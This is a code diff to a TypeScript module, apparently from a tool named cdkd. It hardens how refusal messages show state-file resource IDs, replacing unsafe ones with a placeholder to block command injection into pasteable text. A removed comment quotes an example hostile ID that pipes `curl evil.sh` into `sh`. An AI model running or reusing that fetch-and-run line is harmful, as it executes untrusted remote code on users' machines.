@@ -2950,29 +2950,26 @@ const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';
  * shell-quoted, for the reasons that helper's own note gives: each reaches this
  * text from a hand-edited record or an S3 key.
  *
- * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
- * answer {@link safeIdentifier}'s note already prescribes for names in a
- * `', '`-joined list, applied one level down. The three properties that matters
- * for, in the order they bite:
+ * **A LOGICAL ID is NAMED only when it is a plain identifier inert on a
+ * command line, and DESCRIBED otherwise** — as {@link UNSAFE_ID_DESCRIPTION},
+ * the maintainer's decision on go-to-k/cdkd#4229, taken by every text this
+ * builder serves (go-to-k/cdkd#4253). Each of them ends on a pasteable
+ * `cdkd state show`, and an id is a key of the `resources` map, so whoever can
+ * write the state bucket chooses it. Named means both of:
  *
- * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
- *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
- *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
- *    real `Bucket` and the refusal names the intact record: the operator opens
- *    it, finds nothing wrong, and concludes cdkd is the broken party while the
- *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
- *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
- *    module's identity clause. `displayIdent` compares the sanitized text
- *    against the raw one and JSON-quotes whenever they differ, so a padded id
- *    can never render bare.
- * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
- *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
- *    forged remedy ahead of the real one, on a line that ends in a pasteable
- *    command. It also supplies the quotes the old `shellQuote` wrapper added —
- *    which is why the wrapper GOES rather than composing, per the same note.
- * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
- *    content, where the old `...` tail was indistinguishable from a legitimate
- *    id ending `Prod...`.
+ * 1. **`displayIdent` renders it UNCHANGED.** `displaySafe` TRIMS, so a padded
+ *    `"Bucket "` beside a healthy `Bucket` would otherwise name the INTACT
+ *    record (go-to-k/cdkd#3164, the review of go-to-k/cdkd#3191); a sanitized,
+ *    JSON-quoted or `[cut: N more characters withheld]` render is not the id.
+ *    Describing such an id still never names the healthy sibling.
+ * 2. **`isInertUnquoted`.** JSON quotes, which the earlier render relied on,
+ *    still expand `$( )` and a backtick, and turn inside out behind an unpaired
+ *    `'` or `"` the operator pasted above the message; an id is inert only when
+ *    no quoting is needed at all. That predicate also refuses whitespace and
+ *    the `~` a tilde expansion reads, neither of which `displayIdent` quotes.
+ *
+ * So a hostile, padded, cut or unrenderable id prints the same placeholder,
+ * and the operator finds it with the `cdkd state show` the text ends on.
  *
  * The cap is passed EXPLICITLY although it equals the default: a logical id is
  * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
@@ -2995,16 +2992,7 @@ const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';
 function namedPropertyBagsDiagnosis(
   stackName: string | undefined,
   region: string | undefined,
-  logicalIds: readonly string[],
-  /**
-   * DESCRIBE each id that is not a plain identifier inert on a command line,
-   * instead of JSON-quoting it: JSON quotes still expand `$( )` and a backtick,
-   * and turn inside out behind an unpaired `'` or `"` pasted above (the
-   * maintainer's decision on go-to-k/cdkd#4229). Only the `cdkd export` text
-   * opts in today; the deploy, diff, orphan and drift texts keep the bare
-   * `displayIdent` render, tracked on go-to-k/cdkd#4253.
-   */
-  describeUnsafe = false
+  logicalIds: readonly string[]
 ): string {
   if (logicalIds.length === 0) {
     throw new Error(
@@ -3013,11 +3001,9 @@ function namedPropertyBagsDiagnosis(
   }
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
-    // A plain id renders unchanged either way.
     .map((id) => {
       const shown = displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS });
-      if (!describeUnsafe || (shown === id && !/\s/.test(id) && isInertUnquoted(id))) return shown;
-      return UNSAFE_ID_DESCRIPTION;
+      return shown === id && isInertUnquoted(id) ? id : UNSAFE_ID_DESCRIPTION;
     })
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
@@ -3849,7 +3835,7 @@ export function malformedExportResourcePropertiesRefusalMessage(
   const stackName = absentIfEmpty(rawStackName);
   const region = absentIfEmpty(rawRegion);
   return inspectTail(
-    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds, true)} ${EXPORT_DELETES_STATE} ` +
+    `${namedPropertyBagsDiagnosis(stackName, region, logicalIds)} ${EXPORT_DELETES_STATE} ` +
       `The export reads this map to build the CloudFormation import identifier, to ` +
       `check it for the redaction mask, and to find what a phase-2 pre-delete removes, so a ` +
       `map it cannot read makes each of those answers wrong — and the record showing the ` +
